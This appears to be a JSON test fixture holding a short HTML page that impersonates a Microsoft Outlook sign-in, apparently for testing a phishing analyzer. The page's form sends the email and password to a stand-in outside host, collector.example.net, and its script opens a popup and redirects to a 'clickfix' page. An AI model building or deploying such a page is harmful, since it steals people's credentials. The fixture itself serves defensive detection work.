            "size": 675,
            "mimeType": "text/html",
            "compression": 0,
            "text": "<!doctype html>\n<html><head><meta charset=\"utf-8\"><title>Sign in to your Microsoft account</title></head>\n<body>\n<h1>Microsoft</h1><p>Sign in to continue to Outlook. Office 365 secure portal.</p>\n<!-- Benign fixture: the form posts credentials to another domain (ANA-4). -->\n<form action=\"https://collector.example.net/submit.php\" method=\"post\">\n  <input type=\"email\" name=\"loginfmt\" autocomplete=\"username\">\n  <input type=\"password\" name=\"passwd\" autocomplete=\"current-password\">\n  <button type=\"submit\">Sign in</button>\n</form>\n<script>\n  window.open('/popup.html', '_blank');\n  setTimeout(function () { location.href = '/clickfix.html'; }, 1500);\n</script>\n</body></html>\n"
